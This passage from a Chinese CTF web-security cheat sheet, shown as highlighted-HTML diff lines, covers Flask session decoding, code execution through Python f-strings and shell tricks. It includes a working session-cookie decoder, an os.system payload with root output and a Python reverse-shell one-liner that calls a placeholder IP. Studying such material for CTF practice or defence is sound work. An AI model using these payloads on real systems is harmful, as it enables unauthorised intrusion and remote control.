+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python3</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">zlib</span>
+<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64decode</span>
+<span class="kn">from</span> <span class="nn">flask.sessions</span> <span class="kn">import</span> <span class="n">session_json_serializer</span>
+<span class="kn">from</span> <span class="nn">itsdangerous</span> <span class="kn">import</span> <span class="n">base64_decode</span>
+
+<span class="k">def</span> <span class="nf">decryption</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
+    <span class="n">payload</span><span class="p">,</span> <span class="n">sig</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+    <span class="n">payload</span><span class="p">,</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">rsplit</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
+
+    <span class="n">decompress</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="k">if</span> <span class="n">payload</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;.&#39;</span><span class="p">):</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
+        <span class="n">decompress</span> <span class="o">=</span> <span class="bp">True</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">base64_decode</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;Could not base64 decode the payload because of &#39;</span>
+                         <span class="s1">&#39;an exception&#39;</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">decompress</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+            <span class="k">raise</span> <span class="ne">Exception</span><span class="p">(</span><span class="s1">&#39;Could not zlib decompress the payload before &#39;</span>
+                             <span class="s1">&#39;decoding the payload&#39;</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">session_json_serializer</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">decryption</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">()))</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html">客户端 session 导致的安全问题</a></p>
+<p>工具：</p>
+<p><a href="https://github.com/noraj/flask-session-cookie-manager">加解密session</a></p>
+<p><a href="https://github.com/Paradoxis/Flask-Unsign">SECRET_KEY 爆破</a></p>
+<p>CTF：</p>
+<p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=53404&amp;fromuid=295700">以CTF角度看待flask session安全问题</a></p>
+<p><a href="https://xz.aliyun.com/t/3569">Python Web之flask session&amp;格式化字符串漏洞</a></p>
+<hr>
+<h4 id="84-python-格式化字符串">8.4 python-格式化字符串</h4>
+<p>1.%操作符</p>
+<p>2.string.Template</p>
+<p>3.调用format方法</p>
+<p>4.f-Strings (执行代码)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="o">&gt;&gt;&gt;</span> <span class="n">a</span> <span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">5</span> <span class="p">,</span> <span class="mi">10</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">f</span><span class="s1">&#39;Five plus ten is {a + b} and not {2 * (a + b)}.&#39;</span>
+<span class="s1">&#39;Five plus ten is 15 and not 30.&#39;</span>
+<span class="o">&gt;&gt;&gt;</span> <span class="n">f</span><span class="s1">&#39;{__import__(&#34;os&#34;).system(&#34;id&#34;)}&#39;</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span>
+<span class="s1">&#39;0&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><a href="https://xz.aliyun.com/t/3569#toc-1">Python格式化字符串问题</a></p>
+<h4 id="85-python-一些其他trick">8.5 python-一些其他trick</h4>
+<p>完全交互式shell:</p>
+<p><code>python -c &quot;import pty;pty.spawn('/bin/bash');&quot;</code></p>
+<p>反弹shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;ip&#34;,4433));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
 </code></pre></td></tr></table>
 </div>
 </div>]]></description>
